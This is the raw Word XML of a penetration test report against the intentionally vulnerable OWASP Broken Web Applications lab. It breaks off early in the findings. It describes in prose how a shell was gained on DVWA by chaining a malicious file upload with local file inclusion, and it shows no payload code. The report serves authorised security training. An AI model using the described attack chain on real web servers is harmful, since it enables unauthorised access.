          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="179BAF08" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D8FAA2D" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="625EFFA8" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EA16BD4" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46A19718" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B7377D8" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7853589B" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01C657E9" w14:textId="77777777" w:rsidR="00C5264E" w:rsidRDefault="00C5264E" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2184C224" w14:textId="307B35A9" w:rsidR="00D00ED1" w:rsidRPr="009D14E4" w:rsidRDefault="00D00ED1" w:rsidP="00984B08">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D14E4">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>EXECUTIVE SUMMARY</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF84E47" w14:textId="77777777" w:rsidR="00AD5018" w:rsidRPr="00AD5018" w:rsidRDefault="00AD5018" w:rsidP="00D00ED1">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:color w:val="E51D1B" w:themeColor="accent4" w:themeShade="BF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E89AED5" w14:textId="754283D6" w:rsidR="00FF06BD" w:rsidRDefault="00CE0CFE" w:rsidP="00FF06BD">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Akolade Adelaja </w:t>
      </w:r>
      <w:r w:rsidR="008579D6">
        <w:t xml:space="preserve">conducted a security assessment of </w:t>
      </w:r>
      <w:r w:rsidR="00D5031E">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="00D91647">
        <w:t>Open Web Application Security Project (OWASP) Broken Web Applications Project</w:t>
      </w:r>
      <w:r w:rsidR="009960FA">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003A4D7B">
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidR="00D5031E">
        <w:t xml:space="preserve"> determine its existing vulnerabilities by engaging in a penetration test that was conducted on the 1</w:t>
      </w:r>
      <w:r w:rsidR="009960FA">
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidR="00D5031E" w:rsidRPr="00D5031E">
        <w:rPr>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>th</w:t>
      </w:r>
      <w:r w:rsidR="00D5031E">
        <w:t xml:space="preserve"> of </w:t>
      </w:r>
      <w:r w:rsidR="009960FA">
        <w:t>March</w:t>
      </w:r>
      <w:r w:rsidR="00D5031E">
        <w:t xml:space="preserve"> 2021.</w:t>
      </w:r>
      <w:r w:rsidR="00FF06BD">
        <w:t xml:space="preserve"> The OWASP Broken Web Applications Project is a collection of vulnerable web applications that </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:t>are</w:t>
      </w:r>
      <w:r w:rsidR="00FF06BD">
        <w:t xml:space="preserve"> distributed on a Virtual Machine </w:t>
      </w:r>
      <w:r w:rsidR="00FF06BD" w:rsidRPr="001D581A">
        <w:t>running a variety of applications with known vulnerabilities</w:t>
      </w:r>
      <w:r w:rsidR="00FF06BD">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A36C946" w14:textId="77777777" w:rsidR="00FF06BD" w:rsidRDefault="00FF06BD" w:rsidP="00D91647">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6063C3E2" w14:textId="6BB57955" w:rsidR="00AD5018" w:rsidRDefault="00AD5018" w:rsidP="00D91647">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The goal of the “pentest” is to act as a malicious actor by performing attacks against the </w:t>
      </w:r>
      <w:r w:rsidR="009960FA">
        <w:t>Broken Web Applications Project</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:t>to discover</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> any vulnerabilities that could lead to a breach and be leveraged to gain access to the </w:t>
      </w:r>
      <w:r w:rsidR="009960FA">
        <w:t>web application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CDDFB99" w14:textId="77777777" w:rsidR="00FF06BD" w:rsidRDefault="00FF06BD" w:rsidP="00AD5018">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03C5509F" w14:textId="22D47D77" w:rsidR="00296EBB" w:rsidRDefault="00D5031E" w:rsidP="00AD5018">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>This assessment harnessed testing</w:t>
      </w:r>
      <w:r w:rsidR="00AD5018">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> based on the </w:t>
      </w:r>
      <w:r w:rsidR="00AD5018" w:rsidRPr="00AD5018">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>NIST SP 800-115 Technical Guide to Information Security Testing and Assessment</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00EB67A8">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>and the</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00AD5018" w:rsidRPr="00AD5018">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>OWASP Testing Guide (v4)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="003A4D7B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t>to provide documentation and proof</w:t>
      </w:r>
      <w:r w:rsidR="003A4D7B" w:rsidRPr="003A4D7B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003A4D7B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r w:rsidR="003A4D7B" w:rsidRPr="003A4D7B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t>developing a working exploit.</w:t>
      </w:r>
      <w:r w:rsidR="00AD5018" w:rsidRPr="00AD5018">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="127FAABA" w14:textId="46C55EDD" w:rsidR="003A4D7B" w:rsidRDefault="003A4D7B" w:rsidP="00AD5018">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CD50E18" w14:textId="49568ADE" w:rsidR="003A4D7B" w:rsidRPr="009D14E4" w:rsidRDefault="003A4D7B" w:rsidP="00AD5018">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="0070C0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D14E4">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t>PHASES OF PENETRATION TEST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EFD27F6" w14:textId="77777777" w:rsidR="003A4D7B" w:rsidRPr="003A4D7B" w:rsidRDefault="003A4D7B" w:rsidP="003A4D7B">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A4D7B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t>Phases of penetration testing activities include the following:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60F2F8D5" w14:textId="2BFCA5CB" w:rsidR="003A4D7B" w:rsidRPr="003A4D7B" w:rsidRDefault="003A4D7B" w:rsidP="003A4D7B">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A4D7B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t>Planning –</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> G</w:t>
      </w:r>
      <w:r w:rsidRPr="003A4D7B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">oals are gathered, and rules of engagement </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">are </w:t>
      </w:r>
      <w:r w:rsidRPr="003A4D7B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t>obtained.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6440F5DE" w14:textId="77777777" w:rsidR="003A4D7B" w:rsidRPr="003A4D7B" w:rsidRDefault="003A4D7B" w:rsidP="003A4D7B">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A4D7B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t>Discovery – Perform scanning and enumeration to identify potential vulnerabilities, weak areas, and exploits.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B253478" w14:textId="35BF09E5" w:rsidR="003A4D7B" w:rsidRDefault="003A4D7B" w:rsidP="003A4D7B">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A4D7B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t>Attack</w:t>
      </w:r>
      <w:r w:rsidR="00EB67A8">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t>/Exploitation</w:t>
      </w:r>
      <w:r w:rsidRPr="003A4D7B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> – Confirm potential vulnerabilities through exploitation and perform additional discovery upon new access.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D2078E4" w14:textId="75C595C3" w:rsidR="003A4D7B" w:rsidRPr="003A4D7B" w:rsidRDefault="003A4D7B" w:rsidP="003A4D7B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A4D7B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Reporting – Document all found vulnerabilities and exploits, failed </w:t>
      </w:r>
      <w:r w:rsidR="00FB7D7B" w:rsidRPr="003A4D7B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t>attempts,</w:t>
      </w:r>
      <w:r w:rsidR="00C10754">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> and recommendation</w:t>
      </w:r>
      <w:r w:rsidR="00FB7D7B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00C10754">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C66A683" w14:textId="1F454814" w:rsidR="003A4D7B" w:rsidRDefault="003A4D7B" w:rsidP="003A4D7B">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FEAF591" w14:textId="1AA59D50" w:rsidR="003A4D7B" w:rsidRDefault="00A66D47" w:rsidP="003A4D7B">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A66D47">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5E90D5A3" wp14:editId="557303D4">
            <wp:extent cx="6116955" cy="3448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4231" cy="3474699"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="060C54B5" w14:textId="77777777" w:rsidR="009960FA" w:rsidRDefault="009960FA" w:rsidP="00AD5018">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="E51D1B" w:themeColor="accent4" w:themeShade="BF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64F941FA" w14:textId="77777777" w:rsidR="009960FA" w:rsidRDefault="009960FA" w:rsidP="00AD5018">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="E51D1B" w:themeColor="accent4" w:themeShade="BF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="449BA8EA" w14:textId="77777777" w:rsidR="009960FA" w:rsidRDefault="009960FA" w:rsidP="00AD5018">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="E51D1B" w:themeColor="accent4" w:themeShade="BF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38A1AB3D" w14:textId="77777777" w:rsidR="009960FA" w:rsidRDefault="009960FA" w:rsidP="00AD5018">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="E51D1B" w:themeColor="accent4" w:themeShade="BF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C5F8103" w14:textId="77777777" w:rsidR="009960FA" w:rsidRDefault="009960FA" w:rsidP="00AD5018">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="E51D1B" w:themeColor="accent4" w:themeShade="BF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15B04FC5" w14:textId="77777777" w:rsidR="007058A3" w:rsidRDefault="007058A3" w:rsidP="00AD5018">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Hlk67056328"/>
    </w:p>
    <w:p w14:paraId="706CCBF2" w14:textId="2B55CD43" w:rsidR="00A952F2" w:rsidRPr="009D14E4" w:rsidRDefault="00A952F2" w:rsidP="00AD5018">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009D14E4">
        <w:rPr>
          <w:color w:val="0070C0"/>
        </w:rPr>
        <w:t xml:space="preserve">FINDINGS OVERVIEW </w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="2"/>
    <w:p w14:paraId="5A5CBD21" w14:textId="0A0E7FF1" w:rsidR="009960FA" w:rsidRPr="00D7632C" w:rsidRDefault="00A952F2" w:rsidP="00D7632C">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="00D7632C">
        <w:t>While conducting the</w:t>
      </w:r>
      <w:r w:rsidR="00A66D47" w:rsidRPr="00D7632C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00D7632C">
        <w:t>penetration test,</w:t>
      </w:r>
      <w:r w:rsidR="00D7632C" w:rsidRPr="00D7632C">
        <w:t xml:space="preserve"> there were several critical vulnerabilities discovered in the </w:t>
      </w:r>
      <w:r w:rsidR="00D517AF">
        <w:t>OWASP Broken Web Application</w:t>
      </w:r>
      <w:r w:rsidR="00D7632C" w:rsidRPr="00D7632C">
        <w:t xml:space="preserve"> A brief technical overview is listed below</w:t>
      </w:r>
      <w:r w:rsidR="00AC0701" w:rsidRPr="00D7632C">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62EE0D88" w14:textId="6175EE75" w:rsidR="00976644" w:rsidRDefault="00976644" w:rsidP="00976644">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="00630312">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">Target: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>DVWA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> –  Local File Inclusion</w:t>
      </w:r>
      <w:r w:rsidR="00A851A9">
        <w:t xml:space="preserve"> Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215F5FE1" w14:textId="1047EA2B" w:rsidR="00976644" w:rsidRPr="007E4921" w:rsidRDefault="00976644" w:rsidP="00AD5018">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>Gained read access to</w:t>
      </w:r>
      <w:r w:rsidR="003353DD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>files by exploiting a Local File Inclusion vulnerability on the DVWA web application</w:t>
      </w:r>
      <w:r w:rsidR="007E4921" w:rsidRPr="007E4921">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007E4921">
        <w:t xml:space="preserve">found on </w:t>
      </w:r>
      <w:r w:rsidR="007E4921" w:rsidRPr="007E4921">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>10.0.2.5/dvwa</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00347FD1">
        <w:t>Files local to the server are access</w:t>
      </w:r>
      <w:r w:rsidR="008A48EB">
        <w:t>ible</w:t>
      </w:r>
      <w:r w:rsidR="00347FD1">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008A48EB">
        <w:t>using</w:t>
      </w:r>
      <w:r w:rsidR="00347FD1">
        <w:t xml:space="preserve"> the include function </w:t>
      </w:r>
      <w:r w:rsidR="008A48EB">
        <w:t>allowing for a low</w:t>
      </w:r>
      <w:r w:rsidR="008A48EB" w:rsidRPr="00D7632C">
        <w:t>-privilege shell</w:t>
      </w:r>
      <w:r w:rsidR="007E4921">
        <w:t>, o</w:t>
      </w:r>
      <w:r w:rsidR="008A48EB" w:rsidRPr="00D7632C">
        <w:t xml:space="preserve">btained by </w:t>
      </w:r>
      <w:r w:rsidR="008A48EB">
        <w:t>exploiting the file upload utility</w:t>
      </w:r>
      <w:r w:rsidR="007E4921">
        <w:t xml:space="preserve"> found on </w:t>
      </w:r>
      <w:r w:rsidR="007E4921" w:rsidRPr="007E4921">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>10.0.2.5/dvwa/vulnerabilities/upload/</w:t>
      </w:r>
      <w:r w:rsidR="00D517AF">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="008A48EB">
        <w:t>u</w:t>
      </w:r>
      <w:r w:rsidR="00347FD1">
        <w:t>pload</w:t>
      </w:r>
      <w:r w:rsidR="008A48EB">
        <w:t>ing</w:t>
      </w:r>
      <w:r w:rsidR="00D517AF">
        <w:t xml:space="preserve"> a</w:t>
      </w:r>
      <w:r w:rsidR="00347FD1">
        <w:t xml:space="preserve"> malicious </w:t>
      </w:r>
      <w:r w:rsidR="00D517AF">
        <w:t>file,</w:t>
      </w:r>
      <w:r w:rsidR="00905DF0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008A48EB">
        <w:t xml:space="preserve">and accessing </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="008A48EB">
        <w:t>malicious file using the include function</w:t>
      </w:r>
      <w:r w:rsidR="00D517AF">
        <w:t xml:space="preserve">. This </w:t>
      </w:r>
      <w:r w:rsidR="00905DF0">
        <w:t>allowed</w:t>
      </w:r>
      <w:r w:rsidR="00737176">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00905DF0">
        <w:t>Adelaja</w:t>
      </w:r>
      <w:r w:rsidR="00737176">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r w:rsidR="00905DF0">
        <w:t>execute operating system commands</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00976644">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="E51D1B" w:themeColor="accent4" w:themeShade="BF"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1602EA1A" w14:textId="77777777" w:rsidR="00D517AF" w:rsidRPr="00A851A9" w:rsidRDefault="00D517AF" w:rsidP="00AD5018">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="CC9900"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C63C902" w14:textId="3EAA7C88" w:rsidR="00976644" w:rsidRDefault="00976644" w:rsidP="00976644">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r w:rsidRPr="00630312">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">Target: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>DVWA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Remote </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:t>ile Inclusion</w:t>
      </w:r>
      <w:r w:rsidR="00A851A9">
        <w:t xml:space="preserve"> Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A8FFA7C" w14:textId="5AF1CD79" w:rsidR="00FC60A7" w:rsidRDefault="00B23753" w:rsidP="00976644">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Hlk67229962"/>
      <w:r>
        <w:t>Gained</w:t>
      </w:r>
      <w:r w:rsidR="001D4594">
        <w:t xml:space="preserve"> l</w:t>
      </w:r>
      <w:r w:rsidR="00D7632C" w:rsidRPr="00D7632C">
        <w:t>ow-privilege shell</w:t>
      </w:r>
      <w:r w:rsidR="004578AC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
